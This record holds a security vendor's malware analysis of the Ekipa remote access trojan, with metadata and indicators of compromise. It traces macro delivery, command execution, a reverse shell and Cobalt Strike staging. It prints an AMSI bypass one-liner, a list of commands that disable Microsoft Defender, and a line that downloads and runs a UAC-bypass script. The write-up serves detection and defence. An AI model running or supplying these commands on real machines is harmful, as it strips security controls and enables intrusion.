{
    "id": "2e18c1f6-fe5c-44af-aca3-7016b2ee27a3",
    "created_at": "2023-02-02T02:08:49.118775Z",
    "updated_at": "2025-03-27T02:05:52.641971Z",
    "deleted_at": null,
    "sha1_hash": "60df9978b0957d6a7cc370fbf192d1ab62574502",
    "title": "2022-12-21 - Malicious Macros Adapt to Use Microsoft Publisher to Push Ekipa RAT",
    "authors": "",
    "file_creation_date": "2023-02-01T07:43:11Z",
    "file_modification_date": "2023-02-01T07:43:11Z",
    "file_size": 1758904,
    "plain_text": "# Malicious Macros Adapt to Use Microsoft Publisher to Push Ekipa RAT\n\n**[trustwave.com/en-us/resources/blogs/spiderlabs-blog/malicious-macros-adapt-to-use-microsoft-publisher-to-push-ekipa-rat/](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/malicious-macros-adapt-to-use-microsoft-publisher-to-push-ekipa-rat/)**\n\n[After Microsoft announced this year that macros from the Internet will be blocked by default in Office,](https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked)\nmany threat actors have switched to different file types such as Windows Shortcut (LNK), ISO or ZIP\nfiles, to distribute their malware. Nevertheless, Office documents are still actively leveraged in many\ncampaigns and pose a large risk to organizations, especially with threat actors continuously finding\nnew ways to avoid detection.\n\nThe Trustwave SpiderLabs’ Research Team has analyzed samples of an Ekipa Remote Access\nTrojan (RAT) in the wild, and found interesting techniques for the use of malicious Office documents.\nAs shown in this research, the Ekipa RAT was added to a sophisticated threat actors’ cyber arsenal\nand used in the Russian – Ukraine war.\n\n## Overview of Functionalities\n\nEkipa is a Remote Access Trojan used for targeted attacks and can be purchased on underground\nforums, as [CloudSEK found in its research. The current price is set at $3,900, which is very high. The](https://cloudsek.com/threatintelligence/ekipa-remote-access-trojan-designed-by-russian-hacktivists-for-targeted-attacks/)\ntrojan leverages MS Office and Visual Basic for Applications as its main infection and operations\nvector. It also comes with a control panel and builders for:\n\nMS Word Macros\nXLL Excel add-ins\nMS Publisher Macros\n\nA Remote Access Trojan is capable of:\n\n\n-----\n\nCollecting information about a targeted system (basic system information, installed AV\nproducts, GPU and CPU information and more)\nBrowsing and downloading of files on attached drives\nDropping files\nExecuting files and commands.\n\nWhen used with malicious Word documents, the trojan’s main functions are implemented in a onetime VBA macro template. When the document is reopened, the server rejects the request to\ndownload the macro template and all subsequent requests for installation actions.\n\n**_Figure 1: Ekipa RAT advertisement on the XSS forum_**\n\n**_Figure 2: Ekipa RAT is continuously updated with new features as seen in presented screenshot_**\n_from the XSS forum._\n\n\n-----\n\n## Analysis of Microsoft Word Documents with Remote Template\n\nThere are multiple documents related to Ekipa RAT on popular malware analysis sites, but since the\nCommand and Control (C2) server rejects the subsequent requests for the remote template, there\nare only a few available for analysis. [Malwarebytes analyzed an early version of the template in July](https://www.malwarebytes.com/blog/threat-intelligence/2021/07/crimea-manifesto-deploys-vba-rat-using-double-attack-vectors)\n2021 and a few samples were discovered by other researchers and posted on [Twitter. The](https://twitter.com/StopMalvertisin/status/1567819601958027266)\ncomprehensive list of samples identified by Trustwave is presented in the IOC section of this blog. In\nthe following paragraphs we analyzed the Microsoft Word remote templates:\n\n4ee626e058e7be9e5d20f314895500c5abf34c61a15a3b9b4f90c04f88c26aad\nE5a302c3d53851be4e09585f7462346a6f7a71b02bf38d8483f5c48e2ab845c7\n\n## Execution\n\n[The initial Microsoft Word document “Приказ №21 от 29-03-2022.docx” was observed in March](https://www.virustotal.com/gui/file/ba7c39cc4e349a852241b929c6046734ab3a8a94d19d0b8abb8f25023bbebfa0)\n2022. Upon execution, it downloads the remote template from the URL:\n```\nhxxps[.]//roskazna[.]net/acpx/t.php?\nt=774b4bcb8d7287d011ac9cb2d7ff2a76659ca82a46e5df7783c9ff011d19b21e17393264b85072391adc0b57f0a\nbea9e&action=show_document&z=1&x=2500.\n\n```\nThis URL pattern matches URLs seen in other documents related to Ekipa RAT. They contact ‘t.php’\nendpoint with parameter \"t\" which is the unique identifier ensuring that the remote template can be\nfetched only once for any given initial Word document file, and parameter “action” with\n“show_document” value.\n\nThe remote template executes the VBA RAT after the user decides to close the document. In\nthe DocumentBeforeClose procedure, it cancels shutdown of the document and instead sets\nthe Application.Visible property to False. Then it executes the main ConnectCP funciton.\n\n**_Figure 3: DocumentBeforeClose procedure in analyzed template_**\n\n## Main Functionalities\n\nIn the ConnectCP routine, the malicious macro collects information about the system and stores it in\na JSON format. Next, it leverages SetTimer to set up a procedure (“TimerProc”) that will execute\nevery 2.5 seconds. The time interval value is the ‘x’ parameter in the initial URL fetching the remote\ntemplate.\n\nThe timer procedure executes the function responsible for sending the initially collected data about\nthe system to the Command-and-Control server. In response the server returns a list of tasks for the\ntrojan to execute.\n\n\n-----\n\n**_Figure 4: System information collection and exfiltration._**\n\nThe RAT has nine different tasks that it can implement. These are similar to what Malwarebytes\nobserved in its research, notably that the shellcode execution feature is missing. An interesting\ntechnique used to implement the exaction of a command is described in the following section.\n\n**Task ID** **Task**\n\n1 Set different timer procedure execution interval\n\n2 Enumerate drives\n\n3 Enumerate files and directories\n\n4 Exfiltrate files or directories\n\n5 Download file\n\n6 Not implemented\n\n7 Delete file\n\n8 Copy file\n\n@ Execute command\n\n**_Figure 5: Tasks implemented in the VBA RAT_**\n\n## Commands Execution via SendInput\n\nOne of the analyzed malware capabilities is the execution of commands provided by the Commandand-Control server. For that purpose, threat actors use a technique leveraging [SendInput function](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-sendinput)\nfrom USER32.DLL.\n\n\n-----\n\n**_Figure 6: Beautified VBA code executing commands leveraging SendInput function._**\n\nMalicious VBA Macro synthesizes keyboard input to open ‘Run’ window and execute malicious\ncommands. This way it evades the Parent-Child process relationships. As shown in the example\nbelow, leveraging this technique to run cmd.exe, titled ‘CMDSendInput’, opens a new console\nwindow with the explorer.exe as a parent process and not winword.exe as for the cmd.exe, titled\n“CMDCallShell” opened via classic “Call” and “Shell” Visual Basic functions.\n\n\n-----\n\n**_Figure 8: Process tree with executed_**\n_Command Prompts_\n\n\n**_Figure 7: Example Run Window Starting Command_**\n_Prompt_\n\n\nThis is significant as the Parent-Child process relationships are often the basis for detection of\nmalicious activity by security products.\n\n**e5a302c3d53851be4e09585f7462346a6f7a71b02bf38d8483f5c48e2ab845c7**\n\nBased on Creation Date analysis, this template is a later version of Ekipa RAT. As per this timestamp\nit was created on August 7, 2022, but it was observed in the wild around December 12, 2022.\nMultiple documents were submitted to Virustotal fetching this remote template, suggesting a wider\ncampaign. All used a lure targeting Russian recipients.\n\n\n-----\n\n**_Figure 9: Lure used in document OPRF.docx_**\n\nURLs fetching the remote template share the same pattern as with other C2 servers. Here is an\nexample of the link:\n```\nhxxps://ekb[.]tanzedrom[.]ru/secure-document/t.php?\nt=67b81a557d8dbe296942c0efdc0030f01f03933b9ea815975089e1f8c06db9c521f7ef9b70ad25db8f8483cbbb2\nfb813&action=show_document&z=OPRFTHRD&x=5000\n\n```\nFunctionalities of the VBA RAT in the remote template are similar to those in an earlier version\nanalyzed in previous paragraphs. Notably, there is a new task that can be executed by the RAT\nwhich is a reverse shell. More detail on Reverse Shell Creation is presented in the next section.\n\n## Reverse Shell Creation\n\n\n-----\n\nA new task with Task ID is responsible for creating a reverse shell for the attacker. It creates a\n[‘cmd.exe’ process with a modified StartupInfoA structure so that standard input and output is routed](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa)\nthrough two created pipes. One of them is used to send commands to Command Prompt and the\nsecond one to read the output.\n\n**_Figure 10: Reverse Shell Creation implementation of Ekipa RAT_**\n\n## Use of Ekipa RAT In The Wild\n\nThe most recent Ekipa RAT Command and Control server identified by SpiderLabs is\ndomain ekb[.]tanzedrom[.]ru. This C2 server quickly became inactive, and we were unable to interact\nwith it. However, during our research we were able to communicate with the other identified C2\nserver, domain azure-tech[.]pro.\n\nThe server did not respond to requests fetching the remote template, but after analysis of the\ntemplate observed in earlier infections and described in the previous section, we were able to interact\nwith the server and acquire a list of tasks that were supposed to execute on an infected machine.\nWhat’s interesting is that the C2 server appeared to be geo-fenced to only allow traffic from Ukraine.\nFetched tasks included the download of second stage payloads from another server and execution of\ntwo files.\n\n\n-----\n\n**_Figure 11: Infection flow of a sample communicating with one of the analyzed C2 servers._**\n\nThe second-stage server, 146.70.87[.]218, was not active at the time of the analysis, however\npivoting on this IP address and URL pattern we found additional IP addresses, that we assess with\nhigh confidence to be part of the same malicious infrastructure.\n\n\n-----\n\n**_Figure 12: Identified malicious infrastructure and its similarities_**\n\nSecurity Researcher [@1LuminateTheNet shared directory listing 146.70.87[.]148 on Twitter. We](https://mobile.twitter.com/1LuminateTheNet)\nfound similar batch scripts on active server 185.246.220[.]149.\n\n\n-----\n\n**_Figure 13:_** _Directory Listing identified on one of the servers._\n\nAll batch scripts share similar patterns. {FILENAME}.bat is an encoded Powershell command. An\nexample of which is presented in Figure 14.\n\n**_Figure 14: Example encoded PowerShell command._**\n\nThe decoded command consists of two parts:\n\n1. Obfuscated AMSI bypass oneliner:\n```\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','N\nonPublic,Static').SetValue($null,$true)\n\n```\n\n-----\n\n1. Execution of commands fetched from /load/{FILENAME} URI\n\n**_Figure 15: Example decoded powerDEF.bat script._**\n\n## Analysis of powerDEF.bat\n\nScript powerDEF.bat executes a list of commands tampered with the Microsoft Defender settings\npresented in Figure 16.\n\n1 Add-MpPreference -ExclusionExtension \".bat\"\n\n2 Add-MpPreference -ExclusionExtension \".exe\"\n\n3 Set-MpPreference -EnableControlledFolderAccess Disabled\n\n4 Set-MpPreference -PUAProtection disable\n\n5 Set-MpPreference -EnableControlledFolderAccess Disabled\n\n6 Set-MpPreference -PUAProtection disable\n\n7 Set-MpPreference -DisableRealtimeMonitoring $true\n\n8 Set-MpPreference -DisableBehaviorMonitoring $true\n\n9 Set-MpPreference -DisableBlockAtFirstSeen $true\n\n10 Set-MpPreference -DisableIOAVProtection $true\n\n11 Set-MpPreference -DisablePrivacyMode $true\n\n12 Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true\n\n13 Set-MpPreference -DisableArchiveScanning $true\n\n14 Set-MpPreference -DisableIntrusionPreventionSystem $true\n\n15 Set-MpPreference -DisableScriptScanning $true\n\n16 Set-MpPreference -SubmitSamplesConsent 2\n\n17 Set-MpPreference -EnableControlledFolderAccess Disabled\n\n18 Set-MpPreference -PUAProtection disable\n\n19 Set-MpPreference -HighThreatDefaultAction 6 -Force\n\n20 Set-MpPreference -ModerateThreatDefaultAction 6\n\n\n-----\n\n21 Set-MpPreference -LowThreatDefaultAction 6\n\n22 Set-MpPreference -SevereThreatDefaultAction 6\n\n23 Set-MpPreference -ScanScheduleDay 8\n\n24 Set-MpPreference -MAPSReporting 0\n\n25 Set-MpPreference -HighThreatDefaultAction 6 -Force\n\n26 Set-MpPreference -ModerateThreatDefaultAction 6\n\n27 Set-MpPreference -LowThreatDefaultAction 6\n\n28 Set-MpPreference -SevereThreatDefaultAction 6\n\n29 Set-MpPreference -ScanScheduleDay 8\n\n**_Figure 16: List of commands tempering with Microsoft Defender settings._**\n\n## Analysis of uac.bat\n\n[Script uac.bat executes 1.bat script leveraging User Account Control Bypass from GitHub:](https://github.com/S3cur3Th1sSh1t/WinPwn)\n```\niex(new-object\nnet.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dce\ne26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')UACBypass -noninteractive -command\n\"C:\\windows\\system32\\1.bat\" -technique DiskCleanup\n\n## Analysis of 1.bat, 2.bat and 4.bat\n\n```\nScript 1.bat downloads and executes payload from http[:]//185.246.220[.]149:10443/work6, which is a\nPowerShell Cobalt Strike Beacon loader.\n\n**_Figure 17: Example PowerShell Cobalt Strike Beacon loader_**\n\nConfiguration of the Beacon can be extracted using one of the scripts available on [GitHub.](https://github.com/S3cur3Th1sSh1t/WinPwn)\n\n\n-----\n\n**_Figure 18: Cobalt Strike configuration extracted from one of the Beacons_**\n\nScripts 2.bat and 4.bat work analogically to 1.bat, they differ in the URL to fetch the Beacon\nPowerShell loader and Cobalt Strike Team Server IP address in the configuration.\n\n## Attribution\n\nAll Cobalt Strike configurations shared the same watermark (206546002),\nwhich [TrendMicro researchers tied to the Play and Quantum ransomware groups. Cobalt Strike](https://www.trendmicro.com/en_us/research/22/i/play-ransomware-s-attack-playbook-unmasks-it-as-another-hive-aff.html)\nbeacons with this watermark were dropped by Emotet and SVCReady botnets.\n\nThe Ekipa RAT is also being used in the Russian -Ukraine Conflict. While the analyzed Command\nand Control server azure-tech[.]pro seemed to be geo-fenced to only allow traffic from Ukraine, other\ndocuments were used in attacks against Russia. Documents communicating with kc3[.]ru and roskazna[.]net domains used lures targeting Russian recipients.\n\n**_Figure 19: Lure used in document “Приказ №21 от 29-03-2022.docx” impersonating Federal_**\n_Treasury of Russia_\n\n\n-----\n\nThe Institute of Natural and Technical Systems is a Russian entity being [sanctioned by the](https://sanctions.nazk.gov.ua/en/sanction-company/3946/) Ukrainian\ngovernment. In one of their publications called “List of measures to improve the security of the\norganization's IT infrastructure from the [Ministry of Education and Science” (translation by](https://xn--h1aogd.xn--p1ai/ru/2022/04/09/perechen-mer-po-povysheniyu-zashhishhennosti-it-infrastruktury-organizacii-ot-minobrnauki/)\nTrustwave), they mention the roskazna[.]net domain and document with the same filename as\npresented above and attribute it as part of the campaign against the Russian Federation.\n\n**_Figure 20: Part of the article published by Institute of Natural and Technical Systems_**\n\nTrustwave identified two emails, with the aforementioned document as a malicious attachment,\ntargeting major governmental and financial institutions in the Russian Federation. The first email was\naddressed to the Federal Customs Service of Russia, the second was addressed to one of the\nGazprom Russia departments – main Russian natural resources extractor.\n\n\n-----\n\n**_Figure 21: Emails with malicious attachment targeting the Federal Customs Service of Russia and_**\n_Gazprom Russia_\n\nAs shown in this research, the Ekipa RAT is actively being used to target Russian entities and\nindividuals, which is in line with the Malwarebytes research.\n\nGiven that one of the servers appeared to be geofenced to only allow traffic from Ukraine, there is a\nsmall chance that it was used by two sides of this conflict.\n\nIt is interesting that while being sold on pro-Russian forums, Ekipa RAT is leveraged to target entities\nin Russia, which breaks the unwritten rule of this country’s hacker underground – don’t hack Russia.\n\n## Microsoft Publisher and XLL variants of Ekipa RAT\n\nWe did not identify samples of those EKIPA RAT variants in the wild. The IOC section includes one\nExcel document with embedded macros that, based on the included URL pattern, is an Ekipa RAT\nloader, however the C2 server was inactive during our analysis.\n\nBoth XLL Excel add ins and Publisher variants are most likely a response to Microsoft blocking\nmacros in files downloaded from Internet. While XLL files are widely used by threat actors, Microsoft\nPublisher (.pub) files are a niche.\n\nJust as with other Microsoft office products, like Excel or Word, Publisher files can contain macros\nthat will execute upon the opening or closing the file, which makes them interesting initial attack\nvectors from the threat actor’s point of view. When Microsoft blocked macros from executing in files\ndownloaded from the Internet, it did not do so for the Publisher files.\n\n\n-----\n\n**_Figure 22: Part of Microsoft s documentation at_** _https://learn.microsoft.com/en-_\n_us/deployoffice/security/internet-macros-blocked_\n\nThe user is presented with the warning but is still one click away from executing the malicious file\nand possibly infecting a machine. So far, Trustwave has not observed an uptick in malicious\nPublisher email attachments. Nevertheless, Trustwave SpiderLabs is monitoring the situation.\n\n**_Figure 23: Security Notice displayed when user tries to run Publisher file with Macros downloaded_**\n_from the internet_\n\n## Conclusion\n\nThe Ekipa RAT is a great example of that how threat actors are continuously changing their\ntechniques to stay ahead of the defenders. As shown in this research, the creators of this malware\nare tracking changes in the security industry, like blocking macros from the internet by Microsoft, and\nshifting their tactics accordingly. It is also interesting to see how sophisticated threat actors adopt\nthese new tools into their arsenal for a better chance of completing their objectives.\n\nTrustwave SpiderLabs would like to thank the team members who contributed supplemental findings\nin support of this blog.\n\n## IOCs\n\n**Initial Microsoft Word Documents**\n\n**Initial Document** **C2 Domain**\n\n\n-----\n\n03eb08a930bb464837ede77df6c66651d526bab1560e7e6e0e8466ab23856bac clouddocuments[.]com\n\n\n0661fc4eb09e99ba4d8e28a2d5fae6bb243f6acc0289870f9414f9328721010a\n\n\n8336260aa342272f92b12050772e56b4012c848f58707e704a32ea3705de30b4 azure-tech[.]pro\n\n0b76f4c321ac5193890c4ae32f542e0d95fce42ff9aa5bb0ec4b7d4be932d2ec roskazna[.]net\n\n\n2826e891fb9d9076513005f39e036a9d470b59d6eeaafb71e7ccbd039f349ba5\n\n\n3e74c248a6e2272e0fc9365ce79188241ed3d3924bfbac7ae31caf5ae336b4cb\n\n\n46b899d25e3ee77572a302859e1177cd0cd4a474e4b31e4f1e2cfc0e9a753a98\n\n\n535561be76de14d3d6724ad11ed1cdbe914388d549579fd7f7f0c6fb09431d47\n\n\n563537a99531e62a4e8b7c7e9a15f966e3d22c724d4b83e994a074539ff10159\n\n\n624ea33f8b92dbc98ff07d9c225863ac323a4cc08a5f3599d753efe0c9332409\n\n\n64b131ff403c716d4ff9d4c749e8c7152e6c42f6eddf78c307b0da5f1321fc1e\n\n\n7324f089604e2722860322ce2178692ce9c20c409f31bda6be08e2467bef1d1d\n\n\n765a06387e3da1b3870328eb062864a97b02d047f5d2f08ee39890f8d77dc61d\n\n\n7a03e24535fd73a9e0f98ea692ea802c1e0af3067ae1205a3bcd44314666c393\n\n\n881f38d91652fade6494e59cc8baf4f64508a8daf0f5bfba5328da1d409f107d\n\n\n8c6cfb7e620d57864cbbd55a982c2002a9bf2e6691a40bd08faf53288c54444d\n\n\nb10b48212b256951e69161a4978e5f32a4e402e3a3f69afa67cb4a0546cb62b5\n\n\nb841d0004f4692dd7ec85e661e2e5295199da11ff8d1013ecacdcbf36c33623b\n\n\nba7c39cc4e349a852241b929c6046734ab3a8a94d19d0b8abb8f25023bbebfa0\n\n\n-----\n\nc380a287cc6198feba0e707049031a2f3c606dba1402a9dc3842d861e9023de1\n\n\nc9d2ddf2bf879d165329c5768e256175e972cf5dca589d9ac35e46a037c22877\n\n\ndbb7f05e55fa575cba2c51f2507278ee1e97d92bec8839501e9fef5ffb261c4f\n\n\ne03d018812cab38bd0bf1ac6dfce0131638ce809e2070df4e80546a1635a8159\n\n\ne20effff374b2a9c9422d438c833d875232f30f55e21e359b18a8801b905058e\n\n\ne345e15b73778cb5739cb8d5cb3d1697c825904490c2c57c95b33a12d5219cca\n\n\ne617877f439eaa4fed535e05afae96d91d7e483ae7d3a5b64d487a74f2071461\n\n\ne6ecb28f57fff1548b46869a15d5e684ba21fd724f833292438bdbc11b43666e\n\n\nf07946d42ae26e19657c0e13b58650bc003d4232238198d0edf870181c3015dc\n\n\nf95c757e7bfe75f440120f60671f6d00c7a94f588e5d5fda0081dd819e685060\n\n\nff18d3bb78b00e501628725dfa4b1ec1e4e65ba48f45b442142ccf420993a4e1\n\n\n619564eb8a89522cadaba85060221052612bf04c3199c10580317a1e7b1ac381 xlssmooth[.]xyz\n\n8c45ef0dc9b48205924b93c0c30e617bd6b5daa5672d67a72504d2c8e586f84c kc-3[.]ru\n\n\nc18b825130accac6ec129c59ba06e74350b0255856f7f59b437ff20f2a789c78\n\n\nd77ac3175bfa0c7832111099be004b06ca9569101b07611d151c845ddb268db6\n\n\ne7434bb1a8f57230f689f0809aee05340af46ff8e8c05b6a7a266dc57b6f14cc\n\n\n5d12d567c4d85657cce63bf73868eda9b98f76b91cea6cb1ada4840a53314061 mejito[.]ru\n\n\nb91e10c2c01b398dbf27df0274604b8efe78e0a51f947ade9ad6d198df5c31e5\n\n\nc117df5fe9bd83998c1e2cc1f0bc0bc4ac8a567b355c1fab515f1381c4c0e52e\n\n\nce792512a4a2a19f2c43582a6f44cb11a9f33afa5f6cda9e4e78529ce1c653de\n\n\n-----\n\n72933000d4e210b981de3f768af24bcb6e545087ba36ca0c4bbf9c27a4962fc6 ekb[.]tanzedrom[.]ru\n\n\naa25233e5566d73102fa499f1ffb928af566c172ee89218ed9aa42e4edefcece\n\n\ne587b272d96ab772dada266f8f580e342fcb84e9611b7961f3e1aa7dfbc37415\n\n\ne7b68ee7b73b4d0debc5342fcadfd64598769d67af6b13909dffeee0c284ee47\n\n\nf0a324064c2a2e981177c24fc5bcaa0131d7fc1380d56f94f6c28c259f92a843\n\n\nf2c404c22fba58c3e69d2e1d526b100040874206b06c13052f2099867850f008\n\n\n## Microsoft Word Remote Templates\n\n4ee626e058e7be9e5d20f314895500c5abf34c61a15a3b9b4f90c04f88c26aad\n\ne5a302c3d53851be4e09585f7462346a6f7a71b02bf38d8483f5c48e2ab845c7\n\n## Initial Microsoft Excel Document\n\n**Initial Document** **C2 Domain**\n\n9bfb2393b5985577ba223360e24a398fdc93914243414a3350d3faee809135f5 atp-telemetryhub[.]com\n\n## In the Wild Use\n\n146[.]70[.]87[.]218 IP\naddresses\nhosting\n2nd stage\npayloads\n\n146[.]70[.]87[.]148\n\n146[.]70[.]87[.]186\n\n193[.]47[.]61[.]182\n\nhxxp://146[.]70[.]87[.]218/load/6.bat 2nd stage\nbatch\nscript\nobserved\nin Ekipa\nRAT\ncampaign\n\n\n-----\n\nhxxp://146[.]70[.]87[.]218/load/doc.dll 2nd stage\ndll\nobserved\nin Ekipa\nRAT\ncampaign\n\nhxxp://193[.]47[.]61[.]182/load/powerDEF.bat 9f8b39480505b822c0a34f60f0604a68 Batch\nscript\ntempering\nwith\nDefender\nsettings.\n\nhxxp://193[.]47[.]61[.]182/load/uac.bat 1c25e329b603f8b8088d7f291c308b39 Batch\nscript with\nUAC\nbypass\n\nhxxp://193[.]47[.]61[.]182/load/1.bat e322156d6b142647e61f22c6929a2c08 Batch\nscripts\nleading to\nCobalt\nStrike\nbeacon\ninstallation.\n\nhxxp://193[.]47[.]61[.]182/load/2.bat 50433cf9c4fe37db367e9741b36b58d8\n\nhxxp://193[.]47[.]61[.]182/load/4.bat c236ba55a7e3513fd59d39c75356a52f\n\nhxxp://185[.]246[.]220[.]149:10443/work6 4ad293fe645ca18db71273771418f440 PowerShell\nCobalt\nStrike\nbeacons\nloaders\n\nhxxp://185[.]246[.]220[.]148:10443/work5 45246a95de6022d3bd254f4e8f460436\n\nhxxp://85[.]208[.]136[.]130:80/work2 4896024921a0b23d84f75e845452759d\n\n185[.]246[.]220[.]149 Cobalt\nStrike team\nserver\n\n185[.]246[.]220[.]148\n\n85[.]208[.]136[.]130\n\n206546002 Cobalt\nStrike\nwatermark\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-12-21 - Malicious Macros Adapt to Use Microsoft Publisher to Push Ekipa RAT.pdf"
    ],
    "report_names": [
        "2022-12-21 - Malicious Macros Adapt to Use Microsoft Publisher to Push Ekipa RAT.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1675303729,
    "ts_updated_at": 1743041152,
    "ts_creation_date": 1675237391,
    "ts_modification_date": 1675237391,
    "files": {
        "pdf": "https://archive.orkl.eu/60df9978b0957d6a7cc370fbf192d1ab62574502.pdf",
        "text": "https://archive.orkl.eu/60df9978b0957d6a7cc370fbf192d1ab62574502.txt",
        "img": "https://archive.orkl.eu/60df9978b0957d6a7cc370fbf192d1ab62574502.jpg"
    }
}